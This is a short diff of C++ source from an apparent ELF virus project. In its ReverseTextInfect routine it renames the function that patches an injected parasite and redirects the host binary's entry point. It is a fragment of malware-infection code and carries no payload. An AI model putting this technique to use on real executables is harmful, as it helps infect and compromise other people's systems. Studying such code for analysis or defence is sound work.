@@ -2,7 +2,7 @@
 #include <elf.h>
 #include "common/file_descriptor.hh"
 #include "common/patch_pattern.hh"
-#include "common/patch_relinguish_control.hh"
+#include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
 #include "nostdlib/string.hh"
 
@@ -246,9 +246,9 @@ bool ReverseTextInfect::inject(
                    original_code_segment_file_offset_);
 
   // Patch parasite to resume host code after execution.
-  return patch_parasite_and_relinquish_control(
-      ehdr.e_type, original_e_entry_, ehdr.e_entry, virus_offset,
-      parasite_mapping.size(), host_mapping);
+  return redirect_elf_entry_point(ehdr.e_type, original_e_entry_, ehdr.e_entry,
+                                  virus_offset, parasite_mapping.size(),
+                                  host_mapping);
 }
 
 bool ReverseTextInfect::analyze(
